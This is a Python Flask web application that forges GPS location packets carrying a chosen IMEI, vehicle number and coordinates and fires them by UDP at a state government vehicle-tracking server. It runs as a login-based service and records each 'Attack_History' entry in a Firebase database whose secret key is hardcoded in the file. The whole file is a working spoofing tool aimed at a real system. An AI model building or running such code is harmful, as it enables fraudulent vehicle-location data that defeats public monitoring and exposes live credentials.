import os, socket, threading, time, requests, random, uuid
from datetime import datetime, timedelta, timezone
from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for

app = Flask(__name__)
app.secret_key = "nitro_v82_hybrid_fixed_edition_2026"

# --- FIREBASE CONFIG ---
FB_URL = "https://ghop-ghop-gps-injection-default-rtdb.firebaseio.com/"
FB_SECRET = "hpa10b2FOtP4nP5aYjtMWSoq3bdp1n5sbH6lPDjE"

TAG_LIST = ["RA18", "WTEX", "MARK", "ASPL", "LOCT14A", "ACT1", "AIS140", "VLTD", "VLT", "GPS", "AMAZON", "BBOX77", "EGAS", "MENT", "MIJO", "EMR", "ROADRPA"]
NEW_SUFFIX = "0.00,0.0,11,73,0.8,0.8,airtel,1,1,11.5,4.3,0,C,26,404,73,0a83,e3c8,e3c7,0a83,7,e3fb,0a83,7,c79d,0a83,10,e3f9,0a83,0,0001,00,000041"
FIXED_CS = "DDE3"

user_sessions = {}

def get_ist_time():
    return datetime.now(timezone.utc) + timedelta(hours=5, minutes=30)

def get_sid():
    return session.get('device_sid', 'guest')

# --- PURANE MAIN.PY KA DB FUNCTIONS ---
def log_to_firebase(uid, status_obj):
    try:
        now = get_ist_time()
        sid = status_obj.get("session_id", "000000")
        log_data = {
            "Vehicle_No": status_obj["vno"],
            "IMEI_No": status_obj["imei"],
            "Lat": status_obj["lat"],
            "Lon": status_obj["lon"],
            "Start_Time": now.strftime('%H:%M:%S')
        }
        # Update History & Records
        requests.put(f"{FB_URL}/Attack_History/{now.strftime('%Y-%m-%d')}/{uid}/{sid}_{status_obj['vno']}.json?auth={FB_SECRET}", json=log_data, timeout=5)
        requests.put(f"{FB_URL}/Data_Records/{status_obj['vno']}.json?auth={FB_SECRET}", json=log_data, timeout=5)
    except: pass

# --- HYBRID FIRING ENGINE (POINT 3 PROTECTED) ---
def firing_engine(sid_key):
    target = ("vlts.bihar.gov.in", 9999)
    while user_sessions.get(sid_key, {}).get("firing"):
        try:
            s = user_sessions[sid_key]
            tag = TAG_LIST[s["count"] % len(TAG_LIST)]
            now = get_ist_time()
            
            # Hybrid 7-digit precision
            lat_f = "{:.7f}".format(float(s['lat']))
            lon_f = "{:.7f}".format(float(s['lon']))
            dt = now.strftime("%d%m%Y,%H%M%S")

            # Point 3: Special Termination preserved exactly
            pkt = f"$PVT,{tag},2.1.1,NR,01,L,{s['imei']},{s['vno']},1,{dt},{lat_f},N,{lon_f},E,{NEW_SUFFIX},{FIXED_CS}*"
            payload = pkt + " \r \n " # This is the Hybrid Special part
            
            user_sessions[sid_key]["last_pkt"] = pkt
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(payload.encode('ascii'), target)
            user_sessions[sid_key]["count"] += 1
            sock.close()
            time.sleep(0.05)
        except: time.sleep(1)

# --- FLASK ROUTES (SAME AS OLD MAIN.PY) ---
@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        uid = request.form.get('userid', '').strip()
        pw = request.form.get('password', '').strip()
        data = requests.get(f"{FB_URL}/users/{uid}.json?auth={FB_SECRET}").json()
        if data and str(data.get('password')) == str(pw):
            session['user'] = uid
            sid_key = str(uuid.uuid4())
            session['device_sid'] = sid_key
            user_sessions[sid_key] = {"uid": uid, "firing": False, "count": 0, "imei": "", "vno": "", "lat": "25.6489270", "lon": "84.7841180", "last_pkt": "Ready...", "score": {}}
            return redirect(url_for('dashboard'))
    return render_template_string(open('login.html').read()) # Maan ke chal rha hu login.html file hai

@app.route('/dashboard')
def dashboard():
    uid = session.get('user')
    sid_key = get_sid()
    if not uid or sid_key not in user_sessions: return redirect(url_for('login'))
    return render_template_string(open('dashboard.html').read(), user_id=uid, status=user_sessions[sid_key])

@app.route('/action', methods=['POST'])
def action():
    uid = session.get('user')
    sid_key = get_sid()
    val = request.form.get('btn')
    
    if val == "start" and not user_sessions[sid_key]["firing"]:
        user_sessions[sid_key].update({
            "firing": True,
            "session_id": get_ist_time().strftime('%H%M%S'),
            "imei": request.form.get('imei'),
            "vno": request.form.get('vno').upper(),
            "lat": request.form.get('lat'),
            "lon": request.form.get('lon')
        })
        log_to_firebase(uid, user_sessions[sid_key])
        threading.Thread(target=firing_engine, args=(sid_key,), daemon=True).start()
    elif val == "stop":
        user_sessions[sid_key]["firing"] = False
    elif val == "reset":
        user_sessions[sid_key].update({"firing": False, "count": 0, "imei": "", "vno": ""})
    return redirect(url_for('dashboard'))

@app.route('/check_vehicle')
def check_vehicle():
    vno = request.args.get('vno', '').upper()
    data = requests.get(f"{FB_URL}/Data_Records/{vno}.json?auth={FB_SECRET}").json()
    return jsonify({"imei": data.get('IMEI_No')}) if data else jsonify({"imei":None})

@app.route('/data')
def data():
    sid_key = get_sid()
    if sid_key in user_sessions:
        today = get_ist_time().strftime('%Y-%m-%d')
        score = requests.get(f"{FB_URL}/User_Audit/{today}/{user_sessions[sid_key]['uid']}.json?auth={FB_SECRET}").json()
        user_sessions[sid_key]['score'] = score if score else {}
    return jsonify(user_sessions.get(sid_key, {}))

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
